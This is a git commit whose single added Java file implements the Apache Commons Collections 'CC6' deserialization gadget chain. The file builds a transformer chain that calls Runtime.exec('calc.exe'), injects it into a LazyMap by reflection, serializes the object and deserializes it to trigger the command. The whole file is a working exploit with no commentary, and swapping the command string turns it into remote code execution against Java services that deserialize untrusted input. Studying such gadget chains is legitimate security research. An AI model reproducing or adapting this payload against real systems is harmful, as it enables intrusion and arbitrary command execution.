58871c8db8641f58db4ca6423e9621b6a5747321
outlaws <outlaws@88.com>
2022-07-16 16:58:14 +0800

    add cc6

---
+++ src/main/java/com/outlaws/cc/CommonCollections6.java
@@ -0,0 +1,55 @@
+package com.outlaws.cc;
+
+import org.apache.commons.collections.Transformer;
+import org.apache.commons.collections.functors.ChainedTransformer;
+import org.apache.commons.collections.functors.ConstantTransformer;
+import org.apache.commons.collections.functors.InvokerTransformer;
+import org.apache.commons.collections.keyvalue.TiedMapEntry;
+import org.apache.commons.collections.map.LazyMap;
+
+import java.io.*;
+import java.lang.reflect.Field;
+import java.lang.reflect.Method;
+import java.util.HashMap;
+import java.util.Map;
+
+/**
+ * @auther : outlaws
+ * @date : 2022/7/16 15:01
+ * @use : CC6
+ */
+
+public class CommonCollections6 {
+
+    public static void main(String[] args) throws NoSuchFieldException, IllegalAccessException, IOException, ClassNotFoundException {
+
+        Transformer[] transformers = new Transformer[]{
+                new ConstantTransformer(Runtime.class),
+                new InvokerTransformer("getMethod", new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", new Class[0]}),
+                new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class}, new Object[]{null, new Object[0]}),
+                new InvokerTransformer("exec", new Class[]{String.class}, new String[]{"calc.exe"}),
+                new ConstantTransformer(1),
+        };
+        Transformer transformerChain = new ChainedTransformer(transformers);
+
+        Map<Object, Object> innerMap = new HashMap<>();
+        Map<?, ?> outerMap = LazyMap.decorate(innerMap, new ConstantTransformer(1));
+        TiedMapEntry tiedMapEntry = new TiedMapEntry(outerMap,"key");
+        HashMap<Object,Object> expMap = new HashMap<>();
+        expMap.put(tiedMapEntry,"value");
+//        outerMap.remove("key");
+
+        Field factoryField = LazyMap.class.getDeclaredField("factory");
+        factoryField.setAccessible(true);
+        factoryField.set(outerMap,transformerChain);
+
+        ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
+        ObjectOutputStream objectOutputStream = new ObjectOutputStream(byteArrayOutputStream);
+        objectOutputStream.writeObject(expMap);
+        objectOutputStream.close();
+
+        ObjectInputStream objectInputStream = new ObjectInputStream(new ByteArrayInputStream(byteArrayOutputStream.toByteArray()));
+        objectInputStream.readObject();
+
+    }
+}
